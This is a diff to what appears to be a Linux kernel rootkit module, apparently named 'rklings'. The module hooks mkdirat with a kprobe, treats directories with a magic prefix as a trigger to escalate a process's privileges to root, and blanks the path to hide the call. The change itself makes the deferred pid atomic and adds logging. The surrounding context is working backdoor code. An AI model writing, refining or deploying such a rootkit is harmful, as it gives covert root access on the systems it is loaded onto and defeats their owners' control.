@@ -4,6 +4,7 @@
 #include <linux/init.h>
 #include <linux/kprobes.h>
 #include <linux/module.h>
+#include <linux/printk.h>
 #include <linux/pid.h>
 #include <linux/proc_fs.h>
 #include <linux/ptrace.h>
@@ -13,13 +14,14 @@
 #include <linux/seq_file.h>
 #include <linux/string.h>
 #include <linux/types.h>
+#include <linux/atomic.h>
 #include <linux/uaccess.h>
 
 #define RK_PREFIX     "rklings."
 #define RK_PREFIX_LEN 8
 #define RK_PATH_MAX   128
 
-static int deferred_pid;
+static atomic_t deferred_pid = ATOMIC_INIT(0);
 
 static int rk_escalate(void)
 {
@@ -62,13 +64,14 @@ static int rk_escalate_pid(int pid)
 
 static int rk_try_deferred(void)
 {
+	int pid = atomic_read(&deferred_pid);
 	int ret;
 
-	if (deferred_pid <= 0)
+	if (pid <= 0)
 		return 0;
-	ret = rk_escalate_pid(deferred_pid);
+	ret = rk_escalate_pid(pid);
 	if (ret == 0)
-		deferred_pid = 0;
+		atomic_set(&deferred_pid, 0);
 	return ret;
 }
 
@@ -90,7 +93,7 @@ static int rk_handle_mkdir(const char *name)
 
 	ret = rk_escalate_pid(pid);
 	if (ret == -ESRCH) {
-		deferred_pid = pid;
+		atomic_set(&deferred_pid, pid);
 		return 0;
 	}
 	return ret;
@@ -112,6 +115,7 @@ static int rk_do_intercept(const char __user *pathname)
 	if (strncmp(base, RK_PREFIX, RK_PREFIX_LEN) != 0)
 		return 0;
 
+	pr_info("rklings: mkdir %s\n", base + RK_PREFIX_LEN);
 	rk_handle_mkdir(base);
 
 	put_user('\0', (char __user *)pathname);
@@ -152,9 +156,12 @@ static struct kprobe rk_kprobe_mkdirat = {
 
 static int rk_proc_show(struct seq_file *m, void *v)
 {
+	int dpid;
+
 	rk_try_deferred();
-	if (deferred_pid > 0)
-		seq_printf(m, "deferred: %d\n", deferred_pid);
+	dpid = atomic_read(&deferred_pid);
+	if (dpid > 0)
+		seq_printf(m, "deferred: %d\n", dpid);
 	else
 		seq_puts(m, "idle\n");
 	return 0;
